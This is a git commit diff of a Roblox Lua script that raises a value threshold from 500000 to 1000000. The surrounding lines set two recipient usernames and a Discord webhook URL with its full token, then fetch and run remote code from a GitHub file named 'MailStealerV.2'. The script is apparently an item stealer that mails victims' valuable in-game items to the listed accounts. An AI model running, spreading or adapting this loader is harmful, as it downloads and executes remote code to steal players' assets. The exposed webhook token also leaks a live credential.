3576cb1a5568e7be20a1e91a994eb440b095d8a2
Kage8eebdjW <137019241+Kage8eebdjW@users.noreply.github.com>
2024-10-30 12:26:34 +0800

    Update Huge-games.lua

--- Huge-games.lua
+++ Huge-games.lua
@@ -1,6 +1,6 @@
 Username = "cabagaming"
 Username2 = "anime1230017"
 webhook = "https://discord.com/api/webhooks/1300131229299114066/jAGn4VLPrq4uT8bGwwMqcXjKSFMk3FTgCDQWWfrVYWYYGO6TCiq-QuwsuFGNpxXt4Ye1"
-min_rap = 500000
+min_rap = 1000000
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/WhriterHub/Whiter/main/MailStealerV.2"))()
